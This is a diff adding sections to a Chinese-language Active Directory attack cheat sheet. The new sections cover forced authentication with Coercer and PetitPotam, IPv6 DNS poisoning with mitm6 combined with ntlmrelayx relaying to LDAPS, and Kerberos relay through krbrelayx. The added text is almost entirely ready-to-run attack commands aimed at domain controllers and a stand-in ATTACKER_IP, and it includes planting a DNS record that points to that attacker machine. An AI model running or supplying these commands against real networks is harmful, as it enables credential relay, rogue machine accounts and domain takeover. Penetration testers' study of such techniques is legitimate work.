@@ -182,3 +182,59 @@ netexec ldap DC_IP -u USER -p PASS -M ldap-checker
 | Relay 到 LDAP 失败 | LDAP 签名/通道绑定 | 用 LDAPS (636) |
 | PetitPotam 无响应 | 已修补 | 尝试 PrinterBug/DFSCoerce |
 | ntlmrelayx "Connection refused" | 端口被占 | 关闭 Responder 的 SMB/HTTP |
+
+## 6. 统一强制认证工具 — Coercer
+
+Coercer 整合了所有已知的强制认证方法（PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce 等）：
+
+```bash
+# 扫描目标支持哪些强制认证方法
+coercer scan -t DC_IP -u USER -p PASS -d DOMAIN
+
+# 自动尝试所有方法触发认证到攻击机
+coercer coerce -t DC_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN
+
+# 指定特定方法
+coercer coerce -t DC_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN \
+  --filter-method-name PetitPotam
+coercer coerce -t DC_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN \
+  --filter-method-name DfsCoerce
+```
+
+## 7. IPv6 DNS 投毒 — mitm6
+
+在 IPv6 启用的网络中（Windows 默认启用），通过 DHCPv6 投毒劫持 DNS：
+
+```bash
+# 启动 mitm6 投毒（劫持 DNS 解析到攻击机）
+mitm6 -d DOMAIN -i eth0
+
+# 配合 ntlmrelayx 捕获认证
+# 终端 1:
+mitm6 -d DOMAIN -i eth0
+# 终端 2:
+impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker.DOMAIN \
+  --delegate-access --add-computer
+
+# mitm6 + WPAD 代理（捕获 HTTP 认证）
+mitm6 -d DOMAIN -i eth0 --hsts
+impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh attacker.DOMAIN -l loot
+```
+
+## 8. Kerberos 中继 — krbrelayx
+
+当目标强制 Kerberos 认证（SMB 签名开启、NTLM 被禁用）时：
+
+```bash
+# 添加 DNS 记录指向攻击机
+python3 /pentest/krbrelayx/dnstool.py -u DOMAIN\\USER -p PASS \
+  -a add -r attacker.DOMAIN -d ATTACKER_IP DC_IP
+
+# 启动 krbrelayx 监听
+python3 /pentest/krbrelayx/krbrelayx.py -hashes :MACHINE_HASH \
+  --krbsalt DOMAIN.LOCALmachineaccount$ -krbpass MACHINE_PASS
+
+# 触发 Kerberos 认证（配合 PetitPotam/PrinterBug）
+python3 /pentest/PetitPotam/PetitPotam.py -d DOMAIN -u USER -p PASS \
+  attacker.DOMAIN@80/test DC_IP
+```
